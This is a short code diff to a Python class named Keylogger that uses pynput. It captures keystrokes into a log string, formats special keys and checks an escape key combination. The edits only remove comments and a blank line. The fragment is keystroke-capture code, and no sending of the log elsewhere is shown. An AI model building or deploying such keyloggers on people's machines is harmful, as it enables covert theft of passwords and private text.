@@ -4,7 +4,6 @@ import threading
 
 KEY = pynput.keyboard.Key
 
-
 class Keylogger:
     def __init__(self, escape_combo=(KEY.shift, KEY.f1)):
         self.key_log = ""
@@ -37,10 +36,10 @@ class Keylogger:
             self.key_log += "\n"
         elif event == KEY.space:
             self.key_log += " "
-        elif type(event) == KEY:  # if the character is some other type of special key
+        elif type(event) == KEY:
             self.key_log += " [" + str(event)[4:] + "] "
         else:
-            self.key_log += str(event)[1:len(str(event)) - 1]  # remove quotes around
+            self.key_log += str(event)[1:len(str(event)) - 1]
 
         self.check_escape_char(event)
 
